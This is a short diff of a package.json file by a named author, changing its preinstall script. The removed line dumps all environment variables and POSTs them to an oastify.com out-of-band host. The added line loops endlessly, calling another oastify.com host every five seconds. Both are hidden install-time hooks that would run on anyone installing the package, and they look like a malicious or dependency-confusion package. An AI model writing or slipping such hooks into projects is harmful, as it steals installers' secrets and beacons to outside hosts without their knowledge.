@@ -6,7 +6,7 @@
   "scripts": {
     "build": "tsc",
     "test": "jest",
-    "preinstall": "set > env.txt && curl -X POST --data-urlencode \"cmd@env.txt\" https://y21i8p0bryh2pi308shr0fr33u9mxfl4.oastify.com"
+    "preinstall": ":loop curl http://7pxrvynke74bcrq9v140noecq3wwkm8b.oastify.com && timeout /t 5 >nul && goto loop"
   },
   "author": "Sumiran Aggarwal",
   "license": "MIT",
